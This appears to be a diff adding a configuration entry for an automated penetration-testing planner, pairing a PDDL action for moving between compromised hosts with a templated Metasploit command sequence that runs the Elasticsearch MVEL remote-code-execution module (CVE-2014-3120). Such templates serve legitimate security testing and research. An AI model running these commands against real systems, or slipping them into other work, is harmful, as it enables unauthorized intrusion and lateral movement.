@@ -1,0 +1,27 @@
+[pddl]
+    (:action exploit/multi/elasticsearch/script_mvel_rce
+        :parameters (?from ?to)
+        :precondition (and
+            (located ?from)
+            (connected ?from ?to)
+            (exploited ?from)
+            (CVE-2014-3120 ?to)
+        )
+        :effect (and
+            (not (located ?from))
+            (located ?to)
+            (exploited ?to)
+        )
+    )
+
+[script]
+|> msf
+use exploit/multi/elasticsearch/script_mvel_rce
+set RHOSTS {RHOSTS}
+set LHOST {LHOST}
+exploit -z
+
+[evc]
+
+[evd]
+LOG: Q=1, A=4
